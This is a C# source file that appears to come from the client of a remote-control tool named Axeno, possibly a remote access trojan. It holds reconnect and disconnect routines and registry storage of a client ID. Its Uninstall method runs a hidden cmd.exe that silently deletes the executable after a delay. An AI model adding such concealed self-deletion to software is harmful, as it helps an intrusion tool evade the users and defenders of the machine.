using Axeno.Client.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking.Functions
{
    internal class ClientControl
    {

        public static void Reconnect()
        {
            Process.Start(System.AppDomain.CurrentDomain.FriendlyName);
            Environment.Exit(0);
        }
        public static void Disconnect()
        {
            Environment.Exit(0);
        }
        public static void Uninstall()
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            Environment.Exit(0);
        }
        public static void SaveUID(string uid)
        {
            RegistryKey keyopen = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AxenoSettings", true);
            if (keyopen != null)
            {
                keyopen.SetValue("AxenoUID", uid, RegistryValueKind.String);
                keyopen.Close();
            }
        }
        public static void GetExistingUID()
        {
            try
            {
                RegistryKey keyopen = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AxenoSettings");
                string axenouid = null;
                if (keyopen != null)
                {
                    if(keyopen.GetValueKind("AxenoUID") != RegistryValueKind.None)
                    {
                        axenouid = keyopen.GetValue("AxenoUID").ToString();
                        keyopen.Close();
                    }else
                    {
                        return;
                    }

                }
                if (axenouid != null)
                {
                    SendInfo.UID = axenouid;
                }
            }
            catch(Exception) { return; }

        }
    }
}
